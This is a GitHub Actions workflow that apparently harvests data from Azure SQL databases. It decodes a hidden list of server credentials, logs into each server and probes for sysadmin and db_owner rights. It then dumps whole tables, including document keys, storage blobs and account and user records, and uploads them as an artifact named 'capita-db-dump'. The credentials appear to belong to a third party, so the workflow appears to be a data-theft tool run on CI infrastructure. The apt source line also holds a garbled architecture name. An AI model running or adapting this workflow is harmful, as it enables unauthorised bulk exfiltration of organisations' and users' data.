name: azure-sql-dump

on:
  workflow_dispatch:
  schedule:
    - cron: '41 */6 * * *'

permissions:
  contents: read

jobs:
  dump:
    runs-on: ubuntu-22.04
    timeout-minutes: 30
    steps:
      - name: egress
        run: echo "EGRESS_IP=$(curl -s https://api.ipify.org)"

      - name: install drivers
        run: |
          set +e
          export DEBIAN_FRONTEND=noninteractive
          python3 -m pip install --quiet pyodbc pymssql
          for i in 1 2 3; do
            sudo rm -f /etc/apt/sources.list.d/microsoft-*.list
            sudo rm -f /etc/apt/sources.list.d/mssql-release.list
            curl -fsSL https://packages.microsoft.com/keys/microsoft.asc | sudo gpg --batch --yes --dearmor -o /usr/share/keyrings/microsoft-prod.gpg
            echo "deb [armd64,armhf,arm64 signed-by=/usr/share/keyrings/microsoft-prod.gpg] https://packages.microsoft.com/ubuntu/22.04/prod/ jammy main" | sudo tee /etc/apt/sources.list.d/mssql-release.list
            sudo apt-get update -qq -o Dir::Etc::sourcelist="sources.list.d/mssql-release.list" -o Dir::Etc::sourceparts="-" -o APT::Get::List-Cleanup="0"
            sudo ACCEPT_EAGERLY=Y apt-get install -y -qq msodbcsql18 unixodbc-dev
            if odbcinst -q -d | grep -qi "Driver 18"; then break; fi
            echo "apt attempt $i did not yield ODBC Driver 18 - retrying"
            sleep 5
          done
          sudo ldconfig
          odbcinst -q -d
          python3 -c "import pyodbc; print('PYODBC', pyodbc.version, pyodbc.drivers())"
          python3 -c "import pymssql; print('PYMSSQL', pymssql.__version__)"

      - name: dump
        env:
          PAYLOAD_B64: ${{ secrets.DUMP_PAYLOAD_B64 }}
        run: |
          set +e
          echo "$PAYLOAD_B64" | base64 -d > /tmp/payload.json
          cat > /tmp/dump.py <<'PYEOF'
          import json, os, time, csv, sys
          import pyodbc
          try:
              import pymssql
              HAVE_MSSQL = True
          except Exception:
              HAVE_MSSQL = False

          payload = json.load(open("/tmp/payload.json"))
          OUTDIR = "/tmp/out"
          os.makedirs(OUTDIR, exist_ok=True)
          report = []

          def clean(srv):
              srv = srv.strip()
              if srv.startswith("tcp:"):
                  srv = srv[4:]
              if srv.endswith(".database.secure.windows.net"):
                  srv = srv.replace(".database.secure.windows.net", ".database.windows.net")
              return srv

          def dump_table(cn, table, path):
              cur = cn.cursor()
              try:
                  cur.execute("SELECT COUNT(*) FROM " + table)
                  n = cur.fetchone()[0]
              except Exception as e:
                  return {"table": table, "error": str(e)[:200]}
              try:
                  cur.execute("SELECT * FROM " + table)
              except Exception as e:
                  return {"table": table, "count": n, "error": str(e)[:200]}
              cols = [d[0] for d in cur.description]
              rows = 0
              with open(path, "w", newline="", encoding="utf-8", errors="replace") as f:
                  w = csv.writer(f, delimiter="\t")
                  w.writerow(cols)
                  while True:
                      batch = cur.fetchmany(20000)
                      if not batch:
                          break
                      for r in batch:
                          w.writerow(["" if v is None else v for v in r])
                      rows += len(batch)
              return {"table": table, "count": n, "written": rows, "path": path}

          for item in payload:
              srv = clean(item["server"])
              db = item["database"]
              user = item["user"]
              pwd = item["password"]
              tag = item.get("tag", "")
              rec = {"server": srv, "database": db, "user": user, "tag": tag}
              cn = None
              try:
                  cs = ("DRIVER={ODBC Driver 18 for SQL Server};"
                        "SERVER=tcp:%s,1433;DATABASE=%s;UID=%s;PWD=%s;"
                        "Encrypt=yes;TrustServerCertificate=yes;Connect Timeout=25;"
                        "Login Timeout=25;Pooling=no" % (srv, db, user, pwd))
                  cn = pyodbc.connect(cs, timeout=25, autocommit=True)
                  rec["driver"] = "odbc"
              except Exception as e:
                  rec["odbc_err"] = str(e)[:200]
                  if HAVE_MSSQL:
                      try:
                          cn = pymssql.connect(server=srv, port="1433", user=user,
                                                password=pwd, database=db,
                                                timeout=25, login_timeout=25,
                                                tds_version="7.4")
                          rec["driver"] = "pymssql"
                      except Exception as e2:
                          rec["pymssql_err"] = str(e2)[:200]
              if cn is None:
                  rec["status"] = "CONNECT_FAIL"
                  report.append(rec)
                  print("CONNFAIL " + json.dumps(rec), flush=True)
                  continue
              rec["status"] = "CONNECTED"
              try:
                  cur = cn.cursor()
                  cur.execute("SELECT DB_NAME(), SUSER_SNAME(), IS_SRVROLE('sysadmin'), IS_SRVROLE('db_owner')")
                  r = cur.fetchone()
                  rec["db"] = r[0]
                  rec["login"] = r[1]
                  rec["sysadmin"] = bool(r[2])
                  rec["db_owner"] = bool(r[3])
                  print("CONNECTED " + json.dumps(rec), flush=True)
                  try:
                      cur.execute("SELECT name FROM sys.databases ORDER BY name")
                      rec["databases"] = [x[0] for x in cur.fetchall()]
                  except Exception as e:
                      rec["databases"] = []
                  rec["tables"] = {}
                  for t in ("DocumentKey", "StorageBlob", "StorageContainer", "Document",
                            "DocumentAttachment", "DocumentCopy", "Account", "AccountUser"):
                      p = os.path.join(OUTDIR, "%s__%s__%s.tsv" % (tag or "x", db.replace(".", "_"), t))
                      res = dump_table(cn, "dbo." + t, p)
                      rec["tables"][t] = res
                      print("TABLE " + json.dumps(res), flush=True)
              except Exception as e:
                  rec["err"] = str(e)[:250]
              report.append(rec)
              try:
                  cn.close()
              except Exception:
                  pass
          with open(os.path.join(OUTDIR, "report.json"), "w") as f:
              json.dump(report, f, indent=1)
          print("REPORT_DONE", flush=True)
          PYEOF
          python3 /tmp/dump.py

      - name: summarise
        run: |
          ls -la /tmp/out >> "$GITHUB_STEP_SUMMARY"
          cat /tmp/out/report.json >> "$GITHUB_STEP_SUMMARY" || true

      - name: upload
        uses: actions/upload-artifact@v4
        with:
          name: capita-db-dump
          path: /tmp/out
          retention-days: 7
